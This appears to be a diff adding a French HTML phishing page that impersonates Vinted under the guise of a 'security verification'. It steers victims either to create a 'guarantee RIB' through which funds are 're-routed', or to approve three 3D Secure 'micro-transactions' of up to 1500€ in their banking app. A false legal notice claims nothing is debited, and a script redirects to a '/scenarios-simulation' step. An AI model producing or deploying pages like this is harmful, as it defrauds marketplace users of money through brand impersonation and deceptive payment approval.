@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sécurité des Transactions - Vinted</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+            text-align: center;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 650px;
+            box-sizing: border-box;
+            margin: 15px;
+        }
+        .logo {
+            margin-bottom: 25px;
+        }
+        .logo img {
+            max-width: 120px;
+            height: auto;
+        }
+        h2 {
+            font-size: 24px;
+            color: #007b76;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        p {
+            font-size: 0.95em;
+            line-height: 1.6;
+            color: #555;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .highlight-text {
+            color: #007b76;
+            font-weight: bold;
+        }
+
+        /* Styles généraux pour les options */
+        .option-section {
+            border: 1px solid #ddd;
+            background-color: #f9f9f9;
+            border-radius: 6px;
+            padding: 15px 20px;
+            margin-bottom: 20px;
+            text-align: left;
+            cursor: pointer; /* Indique qu'on peut cliquer sur la section */
+            transition: all 0.3s ease;
+        }
+        .option-section:hover {
+            border-color: #007b76;
+            background-color: #f0fff0;
+        }
+        .option-section.active {
+            border-left: 5px solid #007b76; /* Barre latérale après activation */
+            background-color: #e6f7f7;
+        }
+
+        .option-section h3 {
+            font-size: 1.2em;
+            color: #333;
+            margin-top: 0;
+            margin-bottom: 8px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .option-details {
+            display: none; /* Masqué par défaut */
+            padding-top: 10px;
+            border-top: 1px solid #eee;
+            margin-top: 10px;
+        }
+        .option-details p {
+            font-size: 0.95em;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+        .option-details strong {
+            color: #333;
+            font-weight: bold;
+        }
+
+        /* Cadre de décision */
+        .decision-guide {
+            background-color: #e6f7f7;
+            border: 2px solid #007b76;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+        }
+        .decision-guide h3 {
+            color: #007b76;
+            font-size: 1.4em;
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+
+        /* Bouton d'action */
+        .action-button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background-color: #007b76;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            text-align: center;
+            text-decoration: none;
+            margin-top: 15px;
+        }
+        .action-button:hover:not(:disabled) {
+            background-color: #005e5a;
+        }
+        .secondary-button {
+            background-color: #888;
+        }
+        .secondary-button:hover:not(:disabled) {
+            background-color: #666;
+        }
+
+        .legal-warning {
+            background-color: #ffebe6;
+            border: 1px solid #dc3545;
+            border-radius: 5px;
+            padding: 12px;
+            margin-top: 25px;
+            text-align: left;
+            font-size: 0.8em;
+            color: #dc3545;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted">
+        </div>
+
+        <h2>Finalisation de la Vérification de Sécurité</h2>
+
+        <div class="decision-guide">
+            <h3>ÉTAPE SUIVANTE : Veuillez sélectionner le scénario à suivre</h3>
+            <p style="font-size: 0.9em; text-align: center; margin: 5px 0;">Cliquez sur l'option pour afficher les détails et avancer.</p>
+        </div>
+
+
+        <div class="option-section" id="option-rib">
+            <h3 class="toggle-header">Création du RIB de Garantie Sécurisé</h3>
+
+            <div class="option-details" id="details-rib">
+                <p><strong>But :</strong> Créer un compte intermédiaire pour sécuriser les transferts.</p>
+                <p><strong>Détails :</strong> Génération d'un nouveau RIB temporaire qui servira de compte de garantie pour toutes les transactions Vinted. Les fonds seront re-routés via ce compte, ajoutant une couche de sécurité anti-fraude.</p>
+                <p class="highlight-text">Recommandé pour les nouveaux vendeurs ou les dossiers sensibles.</p>
+
+                <button class="action-button" data-next-page="/scenarios-simulation?type=rib">Choisir Option (Nouveau RIB)</button>
+            </div>
+        </div>
+
+        <div class="option-section" id="option-cb">
+            <h3 class="toggle-header">Vérification 3D Secure par Micro-Transactions</h3>
+
+            <div class="option-details" id="details-cb">
+                <p><strong>But :</strong> Sécuriser la carte bancaire enregistrée contre l'utilisation frauduleuse en ligne.</p>
+                <p><strong>Détails :</strong> Réalisation de trois simulations de micro-transactions (0,50€ à 1500€) nécessitant une validation immédiate 3D Secure par l'utilisateur (via App bancaire ou SMS). Cela confirme le titulaire pour les futurs achats et ventes.</p>
+                <p class="highlight-text">Idéal pour les clients souhaitant conserver leur carte actuelle sans changement.</p>
+
+                <button class="action-button secondary-button" data-next-page="/scenarios-simulation?type=cb">Choisir Option (3 Simulations CB)</button>
+            </div>
+        </div>
+
+        <div style="clear: both;"></div>
+
+        <div class="legal-warning">
+            <strong>INFORMATION IMPORTANTE</strong>
+            <p>Toute simulation de micro-transaction ou création de compte de garantie vise uniquement à la vérification d'identité et à la sécurité. Les fonds ne sont pas débités définitivement mais annulés ou re-routés.</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const ribSection = document.getElementById('option-rib');
+            const cbSection = document.getElementById('option-cb');
+            const detailsRib = document.getElementById('details-rib');
+            const detailsCb = document.getElementById('details-cb');
+
+            function toggleDetails(section, details) {
+                // Si la section est déjà active (détails visibles), la refermer
+                const isActive = section.classList.contains('active');
+
+                // Fermer toutes les autres sections
+                ribSection.classList.remove('active');
+                cbSection.classList.remove('active');
+                detailsRib.style.display = 'none';
+                detailsCb.style.display = 'none';
+
+                if (!isActive) {
+                    // Ouvrir la section cliquée
+                    section.classList.add('active');
+                    details.style.display = 'block';
+                }
+            }
+
+            // Écouteur pour l'option RIB
+            ribSection.addEventListener('click', () => {
+                toggleDetails(ribSection, detailsRib);
+            });
+
+            // Écouteur pour l'option CB
+            cbSection.addEventListener('click', () => {
+                toggleDetails(cbSection, detailsCb);
+            });
+
+            // Gestion des redirections pour les boutons dans les détails
+            const actionButtons = document.querySelectorAll('.action-button');
+            actionButtons.forEach(button => {
+                button.addEventListener('click', (e) => {
+                    e.stopPropagation(); // Empêche l'événement de remonter et de fermer la section
+                    const nextPage = button.getAttribute('data-next-page');
+                    if (nextPage) {
+                        button.textContent = "Chargement...";
+                        button.disabled = true;
+                        window.location.href = nextPage;
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
